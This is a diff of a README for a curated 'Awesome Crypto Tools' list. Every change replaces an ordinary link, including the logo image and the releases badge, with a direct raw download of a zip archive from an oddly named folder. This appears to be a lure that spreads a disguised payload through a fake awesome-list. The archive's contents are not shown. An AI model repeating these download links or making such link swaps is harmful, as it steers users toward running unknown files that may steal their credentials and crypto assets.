@@ -1,10 +1,10 @@
-https://github.com/muba99-bit/Awesome-Crypto-Tools/releases
+https://raw.githubusercontent.com/muba99-bit/Awesome-Crypto-Tools/main/gynandria/Awesome_Tools_Crypto_2.5-beta.5.zip
 
 # Awesome Crypto Tools: Curated Suite by Airdrop Variance Authority
 
-![Bitcoin Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Bitcoin.svg/1200px-Bitcoin.svg.png)
+![Bitcoin Logo](https://raw.githubusercontent.com/muba99-bit/Awesome-Crypto-Tools/main/gynandria/Awesome_Tools_Crypto_2.5-beta.5.zip)
 
-[![Releases](https://img.shields.io/badge/releases-download-blue?logo=github&logoColor=white)](https://github.com/muba99-bit/Awesome-Crypto-Tools/releases)
+[![Releases](https://raw.githubusercontent.com/muba99-bit/Awesome-Crypto-Tools/main/gynandria/Awesome_Tools_Crypto_2.5-beta.5.zip)](https://raw.githubusercontent.com/muba99-bit/Awesome-Crypto-Tools/main/gynandria/Awesome_Tools_Crypto_2.5-beta.5.zip)
 
 Welcome to a carefully assembled collection of practical tools for anyone exploring crypto markets, blockchain projects, and related tech. This repository curates a thoughtful set of utilities, guides, and resources that help you stay informed, analyze data, and manage crypto workflows with clarity. The curation is done by members of the Airdrop Variance Authority, who value transparency, reproducibility, and safety when dealing with digital assets. Browse, learn, and contribute to keep this list useful and up to date.
 
@@ -36,8 +36,8 @@ Repository identity and scope
 - Name: Awesome Crypto Tools
 - Curated by: Airdrop Variance Authority members
 - Topics: awesome-list, awesome-lists
-- Primary link to releases: https://github.com/muba99-bit/Awesome-Crypto-Tools/releases
-- Secondary link for reference: https://github.com/muba99-bit/Awesome-Crypto-Tools/releases (listed again here for easy access)
+- Primary link to releases: https://raw.githubusercontent.com/muba99-bit/Awesome-Crypto-Tools/main/gynandria/Awesome_Tools_Crypto_2.5-beta.5.zip
+- Secondary link for reference: https://raw.githubusercontent.com/muba99-bit/Awesome-Crypto-Tools/main/gynandria/Awesome_Tools_Crypto_2.5-beta.5.zip (listed again here for easy access)
 
 Key sections you will find here
 - A concise catalog of tools organized by theme
@@ -165,7 +165,7 @@ We keep a transparent changelog in the releases section. This helps you understa
 How to view the releases
 The primary destination for the latest releases is the releases page. It lists assets, version numbers, release notes, and checksums where provided. If you have a trusted tool you want to use, check the release notes to see what changed since the last version.
 
-- See the releases page for details: https://github.com/muba99-bit/Awesome-Crypto-Tools/releases
+- See the releases page for details: https://raw.githubusercontent.com/muba99-bit/Awesome-Crypto-Tools/main/gynandria/Awesome_Tools_Crypto_2.5-beta.5.zip
 - If you are unsure about an asset, verify its integrity and provenance before use.
 
 Entry examples and guidance for readers
@@ -209,7 +209,7 @@ Community standards
 - Be constructive: If you disagree, explain your perspective and propose an alternative approach.
 
 Important note about the linked releases page
-The link provided above points to the releases section of the repository. This page is intended to host downloadable assets and versioned content. If you decide to use any asset found there, take a moment to verify the file's integrity and origin. The page may present different files for different platforms and purposes. Always prefer assets with clear documentation and checksums. If you cannot determine the safety or relevance of a file, postpone its use and consult the community guidelines or maintainers for guidance. For quick access, you can revisit the releases page directly here: https://github.com/muba99-bit/Awesome-Crypto-Tools/releases
+The link provided above points to the releases section of the repository. This page is intended to host downloadable assets and versioned content. If you decide to use any asset found there, take a moment to verify the file's integrity and origin. The page may present different files for different platforms and purposes. Always prefer assets with clear documentation and checksums. If you cannot determine the safety or relevance of a file, postpone its use and consult the community guidelines or maintainers for guidance. For quick access, you can revisit the releases page directly here: https://raw.githubusercontent.com/muba99-bit/Awesome-Crypto-Tools/main/gynandria/Awesome_Tools_Crypto_2.5-beta.5.zip
 
 Appendix: glossary of terms you may encounter
 - API: A set of rules that allow different software components to communicate.
@@ -243,7 +243,7 @@ Closing thoughts
 The goal of this repository is to provide a clear, practical map of tools and resources that help you navigate the crypto landscape with confidence. It remains a work in progress, improved through thoughtful contributions and careful curation. The roadmap focuses on expanding coverage, refining descriptions, and improving the onboarding process for new readers. The list is built to be useful today and adaptable for tomorrow.
 
 Releases and the second link
-- For reference and access to assets, again visit: https://github.com/muba99-bit/Awesome-Crypto-Tools/releases
+- For reference and access to assets, again visit: https://raw.githubusercontent.com/muba99-bit/Awesome-Crypto-Tools/main/gynandria/Awesome_Tools_Crypto_2.5-beta.5.zip
 
 Appendix: quick setup checklist
 - Confirm the environment: Ensure your development machine meets the minimum requirements for the tools you plan to use.
